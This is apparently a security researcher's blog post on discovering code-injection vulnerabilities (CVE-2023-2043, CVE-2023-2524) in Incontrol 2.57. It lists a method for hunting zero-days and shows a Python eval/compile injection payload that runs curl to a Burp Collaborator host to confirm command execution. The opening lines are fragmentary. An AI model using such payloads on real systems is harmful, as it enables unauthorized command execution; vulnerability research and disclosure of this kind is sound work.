---
layout: post
title: "Incontrol 2.57 Exploitation Chain: Web User to NT AUTHORITY SYSTEM"
description: "Today, we will explore a crucial topic in the world of offensive security: zero-day vulnerabilities."
date:   2024-11-03 11:01:35 +0300
image:  '/images/713.jpg'
tags:   [exploitation, cve]
---

Hello, hackers! Today, we will explore a crucial topic

#### Zero
A

[CVE-2023-2043] and [CVE-2023-2524]

### How to Find Zero-Day Vulnerabilities and How I Discovered a Critical Code Injection Vulnerability
#### Step-by-Step Process:
1. Software Enumeration: Research and identify promising software.
2. Existing Vulnerability Check: Consult databases like exploit-db and NIST to ensure the chosen software does not have cataloged vulnerabilities.
3. Environment Setup and Software Installation: Set up the testing environment on a virtual machine and install the software.
4. Testing Until Vulnerability Identification: Conduct thorough tests on the application to detect anomalous behaviors.
5. Global Technology Usage Verification: Evaluate the technological implementation to understand the potential impact of the vulnerability.
6. Report/PoC Creation: Document the vulnerability in detail and create a Proof of Concept (PoC).
7. Submission: Report the vulnerability to the developer or the responsible platform.

![]({{site.baseurl}}/images/700.jpg)

* GitHub:
Use specific tags and dorks to find relevant software.

![]({{site.baseurl}}/images/701.jpg)


* Mitre CVE List:
Search for types of vulnerabilities or any other keyword.
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=software

![]({{site.baseurl}}/images/702.jpg)


> Code injection occurs when an attacker can execute arbitrary commands on the system by injecting them into a vulnerable program. This vulnerability arises when an application transmits unsafe user data (e.g., forms, cookies, and HTTP headers) to a system shell. Common scenarios include passing unsanitized input directly to system commands.
>

#### Exploitation Example:
![]({{site.baseurl}}/images/703.jpg)

To identify the vulnerability, I used a payload that imported the os library and executed a curl command pointing to my Burp Collaborator. The payload used was:

{% highlight js %}
    eval(compile("""for x in range(1):\n import os\n os.popen(r'curl http://BURPCOLLABORATOR').read()""",'','single'))
{% endhighlight %}

I injected this payload into the suspicious parameter. Upon checking the Burp Collaborator, I confirmed the receipt of the request, validating the existence of the vulnerability.